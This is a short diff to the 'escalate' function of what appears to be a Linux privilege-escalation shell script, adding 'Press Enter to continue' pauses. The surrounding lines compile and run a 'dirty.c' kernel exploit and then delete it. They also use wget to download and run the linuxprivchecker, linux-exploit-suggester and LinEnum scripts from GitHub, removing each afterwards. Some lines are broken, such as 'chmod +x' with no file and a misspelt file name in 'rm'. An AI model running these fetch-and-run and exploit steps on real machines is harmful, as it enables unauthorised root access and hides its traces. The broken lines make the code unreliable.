@@ -172,6 +172,7 @@ function escalate() {
 				gcc -pthread dirty.c -o dirty -lcrypt
 				./dirty
 				rm -rf dirty*
+				read -p "Press Enter to continue"
 		}
 
 
@@ -179,6 +180,7 @@ function escalate() {
 				wget https://raw.githubusercontent.com/sleventyeleven/linuxprivchecker/master/linuxprivchecker.py 2>/dev/null
 				python linuxprivchecker.py
 				rm linuxprivchecker.py
+				read -p "Press Enter to continue"
 		
 		}
 
@@ -186,12 +188,14 @@ function escalate() {
 		function exploitsug(){
 				wget https://raw.githubusercontent.com/mzet-/linux-exploit-suggester/master/linux-exploit-suggester.sh -O les.sh 2>/dev/null
 				chmod +x les.sh; ./les.sh; rm les.sh
+				read -p "Press Enter to continue"
 		}
 
 
 		function lineum(){
 				wget https://raw.githubusercontent.com/rebootuser/LinEnum/master/LinEnum.sh 2>/dev/null
 				chmod +x; ./LinEnum.sh; rm LineEnum.sh
+				read -p "Press Enter to continue"
 		}
 
 
